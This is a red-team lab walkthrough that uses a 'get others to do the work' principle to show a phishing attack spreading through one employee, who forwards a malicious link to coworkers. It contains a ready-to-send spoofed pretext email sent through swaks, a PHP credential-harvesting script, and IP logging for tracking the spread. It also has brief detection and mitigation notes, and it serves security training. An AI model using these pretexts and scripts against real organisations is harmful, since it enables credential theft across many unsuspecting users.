## **Law 7 — Get Others to Do the Work for You**

Interpretation (offensive context):  
Leverage the target to **propagate the attack, gather data, or perform actions on your behalf**. This reduces your footprint and increases trust-based spread.

---

# 🎯 Attack Scenario — _Internal Propagation via Delegated Task (Victim-as-Carrier)_

You trick a user into **forwarding a malicious resource to others**, effectively turning them into a **trusted distribution node**.

**Persona:**

> _Natalia Sokolova_, 20 y/o Project Coordinator

---

# 🔴 Red Team Objective

- Achieve:
    
    - **internal spread without direct attacker interaction**
        
    - multiple credential captures
        
- Use victim to:
    
    - distribute phishing link
        
    - validate legitimacy for others
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim 1 (Initial target)** — 2GB
    
- **Ubuntu Victim 2 (Secondary target)** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Initial Contact (Seed Victim)

You send to Victim 1:

> “Hi, could you please forward this updated policy document to your team? I don’t have everyone’s contact.”

Link:

```
http://192.168.56.101:8080
```

👉 You are delegating distribution.

---

## Phase 2 — Victim Action (Critical Step)

Victim 1:

- trusts request
    
- forwards email to team
    

Now:

- message appears **internally trusted**
    
- attacker is no longer visible
    

---

## Phase 3 — Secondary Exploitation

Victim 2 receives:

> forwarded message from colleague

👉 Trust level increases significantly:

- internal sender
    
- known person
    
- no external indicators
    

---

## Phase 4 — Payload Interaction

Victim 2:

- clicks link
    
- enters credentials
    

👉 You gain **multi-user compromise**

---

## 🛠️ Tooling + Commands

### 1. Initial Email Delivery

```bash
swaks --to victim1@corp.local \
--from natalia.s@corp.local \
--server 192.168.56.101 \
--data "Subject: Quick help

Hi,

Could you forward this updated policy to your team? I don’t have their emails.

http://192.168.56.101:8080

Thanks,
Natalia"
```

---

### 2. Phishing Server

```bash
php -S 0.0.0.0:8080
```

---

### 3. Credential Capture (same as prior)

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

### 4. (Optional) Track Propagation

```php
<?php
file_put_contents("log.txt", $_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
?>
```

👉 Helps show spread in report

---

## Phase 5 — Expected Result

- Victim 1 → becomes distribution vector
    
- Victim 2+ → compromise without direct attacker contact
    

👉 Attack scales **organically**

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Authority delegation**
    
- **Social proof** → “If colleague sent it, it’s safe”
    
- **Pretexting via task assignment**
    

Key principle:

> People trust what comes from their peers more than external sources

---

# 🛡️ Detection & Defensive Insight

Indicators:

- unusual forwarding requests
    
- internal emails with external-style links
    
- multiple users accessing same suspicious URL
    

Mitigation:

- email scanning for forwarded malicious content
    
- internal awareness:
    
    - “Do not blindly forward links”
        
- link reputation checks (even internal)
    

---

# 📄 Report Artifact

### Title:

> Multi-User Compromise via Delegated Trust Propagation

### Include:

- attack chain:
    
    - attacker → victim1 → victim2
        
- email samples (original + forwarded)
    
- credential capture evidence
    
- propagation analysis
    

---

# ⚠️ Operator Insight

Best attacks:

- don’t scale manually
    
- scale through humans
    

You are not:

- sending many emails
    

You are:

> turning one user into a distribution system

---

